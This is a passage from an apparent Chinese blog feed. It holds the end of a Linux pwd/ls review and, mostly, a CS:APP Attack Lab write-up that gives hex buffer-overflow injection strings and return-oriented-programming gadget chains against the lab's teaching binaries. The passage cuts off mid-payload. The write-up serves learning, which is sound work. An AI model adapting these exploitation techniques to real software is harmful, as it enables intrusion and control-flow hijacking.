<li>找到i-节点号n所对应的链接名称(使用opendir, readdir, closedir），重复直到树的顶端；</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ino_t</span> <span class="title">get_inode</span><span class="params">(<span class="keyword">char</span> *dirname)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_work_dir</span><span class="params">(<span class="keyword">ino_t</span> inode_num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inode_to_dirname</span><span class="params">(<span class="keyword">ino_t</span> inode_num, <span class="keyword">char</span> *buf, <span class="keyword">int</span> buflen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    get_work_dir(get_inode(<span class="string">&quot;.&quot;</span>));   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ino_t</span> <span class="title">get_inode</span><span class="params">(<span class="keyword">char</span> *dirname)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (stat(dirname, &amp;info) == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;dirname&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> info.st_ino;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_work_dir</span><span class="params">(<span class="keyword">ino_t</span> inode_num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">ino_t</span> parent_inode;</span><br><span class="line">    <span class="keyword">char</span> buf[SIZE];</span><br><span class="line">    <span class="keyword">if</span> (get_inode(<span class="string">&quot;..&quot;</span>) != inode_num)&#123;</span><br><span class="line">        chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        inode_to_dirname(inode_num, buf, SIZE);</span><br><span class="line">        parent_inode = get_inode(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        get_work_dir(parent_inode);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;/%s&quot;</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inode_to_dirname</span><span class="params">(<span class="keyword">ino_t</span> inode_num, <span class="keyword">char</span> *buf,<span class="keyword">int</span> buflen)</span></span>&#123;</span><br><span class="line">    DIR *dir_ptr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">dire</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((dir_ptr = opendir(<span class="string">&quot;.&quot;</span>)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((dire = readdir(dir_ptr)) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dire-&gt;d_ino == inode_num)&#123;</span><br><span class="line">            <span class="built_in">strncpy</span>(buf, dire-&gt;d_name, buflen);</span><br><span class="line">            buf[<span class="built_in">strlen</span>(buf)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            closedir(dir_ptr);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error looking for inode number %d\n&quot;</span>, (<span class="keyword">int</span>)inode_num);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-ls"><a href="#6-ls" class="headerlink" title="6.ls"></a>6.ls</h3><p>在Linux中文件和目录都被组织目录树，每个节点或者是文件或者是目录，U盘等也是挂载到某个特定的目录，所以ls只要考虑这两种情况，不需要去考虑分区。</p>
<p>目录是一种特殊的文件。</p>
<ol>
<li>打开当前目录的对应的dirp文件；</li>
</ol>
<p>  <code>DIR* dir_ptr = opendir(&quot;.&quot;);</code></p>
<ol start="2">
<li>读取当前目录的dir_ptr结构中的文件名，并打印；</li>
</ol>
<p>  <code>direntp = readdir(dir_ptr)</code></p>
<p>  <code>printf(&quot;%s\n&quot;, direntrp-&gt;name);</code></p>
<ol start="3">
<li>最后关闭打开的dirp文件；</li>
</ol>
<p><strong>问题</strong></p>
<blockquote>
<p>1、怎么样把mode：100644转化为”-rw-r–r–”？</p>
<p>2、user: 1000怎么样转化为tfzhang？</p>
<p>3、group: 1000怎么样转化为tfzhang？</p>
<p>4、变换modtime？</p>
</blockquote>
<p><strong>与操作提取数字位</strong></p>
<blockquote>
<p>通过每位与操作，将每组的rwx位提取出来；比如要提取右起第3位，只要将数值100644与4这个数进行与操作；</p>
</blockquote>
<h3 id="7-cat"><a href="#7-cat" class="headerlink" title="7.cat"></a>7.cat</h3><p>复习不完了，:cry: .</p>
<p>考完了，还算顺利，注意下各种函数的参数位置，着重复习线程与进程还有pwd，cat，ls的实现，没了，挂不了。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>期末复习</tag>
      </tags>
  </entry>
  <entry>
    <title>[csapp] Lab3 Attack Lab</title>
    <url>/2022/02/11/%5Bcsapp%5D%20Lab3%20Attack%20Lab/</url>
    <content><![CDATA[<h1 id="Lab3-Attack-Lab"><a href="#Lab3-Attack-Lab" class="headerlink" title="Lab3 Attack Lab"></a>Lab3 Attack Lab</h1><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>此实验用来熟悉，理解程序运行的时候的 stack 模型。更进一步理解 stack 上可能发生的错误，对常见的攻击手段有深入理解。</p>
<h1 id="2-ctarget-代码注入"><a href="#2-ctarget-代码注入" class="headerlink" title="2. ctarget(代码注入)"></a>2. ctarget(代码注入)</h1><p>对于没有进行如下限制的程序可以使用此方法来进行攻击</p>
<ul>
<li>申请的stack空间不是随机的，是固定的。</li>
<li>使用了不安全的写入方法，或者使用了低级的io，且没有人为的判断缓冲溢出的程序</li>
<li>没有限制内存中的某些stack区域中的指令不能被执行。</li>
</ul>
<h2 id="2-1-Level-1"><a href="#2-1-Level-1" class="headerlink" title="2.1 Level 1"></a>2.1 Level 1</h2><p>要求对 buf 的缓冲区进行溢出，进而让 test 函数不会正常返回，而是运行到 touch1 函数。显然我们需要把 test 栈顶的 ret 指针指向的位置进行覆盖，来指向 touch1 函数。通过 <code>objdump -d</code> 指令，得到 ctarget 的汇编代码，找到 touch1 的位置在 <code>00000000004017c0 &lt;touch1&gt;</code> 。在 lab 给出的 writeup 中，我们知道 test 函数 c code 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">2</span>&#123;</span><br><span class="line"><span class="number">3</span> <span class="keyword">int</span> val;</span><br><span class="line"><span class="number">4</span> val = getbuf();</span><br><span class="line"><span class="number">5</span> <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>

<p>其调用了 getbuf() 函数， 查看该函数的汇编代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:	<span class="number">48</span> <span class="number">89</span> e7             	mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:	e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:	c3                   	retq   </span><br><span class="line">  <span class="number">4017b</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">4017b</span>f:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>

<p>可以得知，该函数在 stack 中申请了 40 bytes，所以我们需要污染41→48 bytes。显然，我们可以得到最简单的注入编码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>可以画出这个攻击的最终内存形态如下：</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled.png" alt="Figure1: referenced from [1]"></p>
<p>Figure1: referenced from [1]</p>
<h2 id="2-2-Level-2"><a href="#2-2-Level-2" class="headerlink" title="2.2 Level 2"></a>2.2 Level 2</h2><p>这个题目要求 test 函数会执行 touch2 函数， 而 touch2 函数需要一个存储了 cookie 无符号整型的 %rdi，所以我们需要首先把 %rdi 存储这个 cookie 值， 然后再跳转到 touch2 函数。</p>
<p>需要使用到 <code>movq $(cookie), %rdi</code> 的指令，这里 cookie 由下载来的作业中的 cookie 来定。</p>
<p>所以首先写一个包含这个指令的 <code>x.s</code> 文件， 然后使用 <code>gcc -c x.s</code> 来得到 object 文件，然后使用  <code>objdump -d</code> 来得到最终的指令为 <code>48 c7 c7 fa 97 69 59</code> ，</p>
<p>所以基本的思路是这样的：</p>
<ul>
<li><code>movq $cookie, %rdi</code></li>
<li><code>pushq (address of touch2)</code></li>
<li><code>ret</code></li>
</ul>
<hr>
<p><em><strong>Aside</strong></em></p>
<p>这里 ret 和 pushq 的作用似乎非常让人疑惑，为什么 ret 会回到 pushq 的地址？这里的 ret 使用的是近返回，近返回的方法是把栈顶之值弹出到指令指针寄存器IP中，然后从这个弹出的指针处进行执行。</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%201.png" alt="Figurew: Referenced from [2]"></p>
<p>Figurew: Referenced from [2]</p>
<p>看图，这是两个不同的指令，编码都不一样。ret表示近返回，retf表示远返回。</p>
<hr>
<p>所以使用 <code>gcc -c</code> 指令编码如下的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq $cookie, %rdi <span class="meta"># change cookie to your own one.</span></span><br><span class="line">pushq %rsp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>这里就需要找到 <code>getbuf</code> 的栈顶在哪里，我们需要把 test 函数的 ret 函数的 ret address 换成 getbuf 的 栈顶。使用 gdb 调试， 把断点打在 getbuf 初始化完 %rsp 的位置。然后 <code>run -q</code> 运行，并使用 <code>info r rsp</code> 得到寄存器目前存储的地址信息。可以得到如下的答案。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>可以画出这个攻击的最终内存形态如下：</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%202.png" alt="Figure3: Referenced from [1]"></p>
<p>Figure3: Referenced from [1]</p>
<h2 id="2-3-Level-3"><a href="#2-3-Level-3" class="headerlink" title="2.3 Level 3"></a>2.3 Level 3</h2><p>这个题目要求 test 函数会执行 touch3 函数， 而 touch3 函数需要一个存储了 cookie 字符串的 %rdi，所以我们需要首先把 %rdi 存储这个 cookie 字符串的指针值， 然后再跳转到 touch3 函数。</p>
<p>所以这里的思路就是需要把 字符串首先存储到一个位置， 然后把这个位置的首地址传给 %rdi， 然后进入到 touch3 函数执行。</p>
<p>！但是这里 writeup 让我们注意的是当调用<code>hexmatch</code>和<code>strncmp</code>时，他们会把数据压入到栈中，有可能会覆盖<code>getbuf</code>栈帧的数据，所以传进去字符串的位置必须小心谨慎。hexmatch 开辟了110字节的栈帧，strncmp 也会开辟空间，但是就代码来看，*s存放的地址是随机的，如果我们将数据放在 getbuf 的栈空间里面，很有可能就被这两个函数覆盖了。所以在这里的思路是，把字符串传入到 caller→test 的stack 区域中，这样字符串可以避免被覆盖。</p>
<p>！对于 ascii 码， 我们可以使用 man ascii 来查看对应 ascii 码的 hex 形式。</p>
<p>！字符串 必须以 <code>\0</code> 结尾。</p>
<p>那么对应的思路如下：</p>
<ul>
<li>把 字符串 传入到 test 栈区中。</li>
<li>把 字符串的指针 传给 %rdi</li>
<li>pushq touch3 地址</li>
<li>ret</li>
</ul>
<p>至于怎么取到字符串的指针，怎么得到这些指令的编码，与 section 2.2 中一致。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> <span class="meta"># mov and push</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># push and ret</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># pointer to test stack top</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="meta"># string of cookie</span></span><br><span class="line"><span class="number">00</span> # <span class="string">&#x27;\0&#x27;</span> <span class="keyword">for</span> <span class="built_in">string</span>.</span><br></pre></td></tr></table></figure>

<p>可以画出这个攻击的最终内存形态如下：</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%203.png" alt="Figure4: Referenced from [1]"></p>
<p>Figure4: Referenced from [1]</p>
<h1 id="3-rtarget-Return-Oriented-Programming"><a href="#3-rtarget-Return-Oriented-Programming" class="headerlink" title="3. rtarget(Return-Oriented Programming)"></a>3. rtarget(Return-Oriented Programming)</h1><p>在 section 2 ctarget 中三条都被启用的情况下，只能使用这个方法。</p>
<h2 id="3-0-review"><a href="#3-0-review" class="headerlink" title="3.0 review"></a>3.0 review</h2><p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%204.png" alt="Untitled"></p>
<p>在栈使用了 randomization 来初始化 stack frame 大小；限制了 memory 中 stack 某些区块的代码执行权限的情况下，需要使用 Return-Oriented Programming 的方法，这个方法的基本想法就是使用已经存在的指令来作为自己的指令执行，从而绕开 stack 区域中的限制。一般而言，可以使用的指令后面需要跟有一个 ret 来返回，通过一系列的指令 <code>[op, ret]-&gt;[op, ret]-&gt;...</code> 可以形成一个 list， 这个形似单链表的结构就是我们的指令的组成。</p>
<p>比如下面的这个具体的例子：</p>
<p>有如下的 c code</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;</span><br><span class="line">*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到 assembly code：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>15 &lt;setval_210&gt;:</span><br><span class="line">	<span class="number">400f</span>15: c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7 movl $<span class="number">0xc78948d4</span>,(%rdi)</span><br><span class="line">	<span class="number">400f</span>1b: c3 retq</span><br></pre></td></tr></table></figure>

<p>上面这个 assembly code 就可以作为我们的 list 中的一个 node。 比如 <code>48 89 c7</code> 就是 <code>movl %rax, %rdi</code> 的一个指令代码，并且已经存在于 可执行代码块中，所以我们可以让 pc(program counter) 指向这个位置 <code>0x400f15 + 4</code> 来指向这个 movl 指令，在执行完以后需要立即 ret，然后执行到下一个 node。</p>
<h2 id="3-1-Level-2"><a href="#3-1-Level-2" class="headerlink" title="3.1 Level 2"></a>3.1 Level 2</h2><p>这个题目让我们做的和上一个 ctarget 中的 level 2 一致。但是我们需要使用 gadget list 来组成所有需要的指令。根据之前的思路，我们是直接把 cookie 存储到 %rdi，需要使用到 movq 和 pop 指令。根据 writeup 的提示，这是可以被使用的 gadget node：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000000000</span> &lt;start_farm&gt;:</span><br><span class="line">   <span class="number">0</span>:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">   <span class="number">5</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000006</span> &lt;getval_142&gt;:</span><br><span class="line">   <span class="number">6</span>:	b8 fb <span class="number">78</span> <span class="number">90</span> <span class="number">90</span>       	mov    $<span class="number">0x909078fb</span>,%eax</span><br><span class="line">   b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000000</span>c &lt;addval_273&gt;:</span><br><span class="line">   c:	<span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3    	lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">12</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000013</span> &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">13</span>:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">19</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000001</span>a &lt;setval_237&gt;:</span><br><span class="line">  <span class="number">1</span>a:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 c7    	movl   $<span class="number">0xc7c78948</span>,(%rdi)</span><br><span class="line">  <span class="number">20</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000021</span> &lt;setval_424&gt;:</span><br><span class="line">  <span class="number">21</span>:	c7 <span class="number">07</span> <span class="number">54</span> c2 <span class="number">58</span> <span class="number">92</span>    	movl   $<span class="number">0x9258c254</span>,(%rdi)</span><br><span class="line">  <span class="number">27</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000028</span> &lt;setval_470&gt;:</span><br><span class="line">  <span class="number">28</span>:	c7 <span class="number">07</span> <span class="number">63</span> <span class="number">48</span> <span class="number">8</span>d c7    	movl   $<span class="number">0xc78d4863</span>,(%rdi)</span><br><span class="line">  <span class="number">2</span>e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000002f</span> &lt;setval_426&gt;:</span><br><span class="line">  <span class="number">2f</span>:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>    	movl   $<span class="number">0x90c78948</span>,(%rdi)</span><br><span class="line">  <span class="number">35</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000036</span> &lt;getval_280&gt;:</span><br><span class="line">  <span class="number">36</span>:	b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3       	mov    $<span class="number">0xc3905829</span>,%eax</span><br><span class="line">  <span class="number">3b</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000003</span>c &lt;mid_farm&gt;:</span><br><span class="line">  <span class="number">3</span>c:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">41</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>而我们需要的代码是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax, %rdi</span><br></pre></td></tr></table></figure>

<p><code>popq %rax</code>的指令字节为：<code>58</code>，所以我们找到了如下函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">4019</span>a7: <span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>ad: c3</span><br></pre></td></tr></table></figure>

<p>从中我们可以得出<code>popq %rax</code>指令的地址为：<code>0x4019ab</code></p>
<p><code>movq %rax, %rdi</code>的指令字节为：<code>48 89 c7</code>，所以我们找到了如下函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6: c3</span><br></pre></td></tr></table></figure>

<p>从中我们可以得出<code>movq %rax, %rdi</code>指令的地址为：<code>0x4019a2</code></p>
<p>最终可以得出需要的指令为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># popq %rax</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># cookie need for movq, will be poped to %rax.</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># movq</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> # touch2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%205.png" alt="Untitled"></p>
<h2 id="3-2-Level-3"><a href="#3-2-Level-3" class="headerlink" title="3.2 Level 3"></a>3.2 Level 3</h2><p>这个题目让我们做的和上一个 ctarget 中的 level 3 一致。但是我们需要使用 gadget list 来组成所有需要的指令。 <strong>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。对于获得偏移量的操作，leaq(, , ),%rax 这个操作是 gcc 经常用来获得偏移量的一个指令。</strong></p>
<p>我们可以得到下面的方法：</p>
<p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br>（2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br>（3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br>（4）调用<code>touch3</code>函数</p>
<p>具体的 geaget 从frame.c 函数的 dump 文件中找到就行</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%206.png" alt="Untitled"></p>
<p>最终的答案是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ad <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span 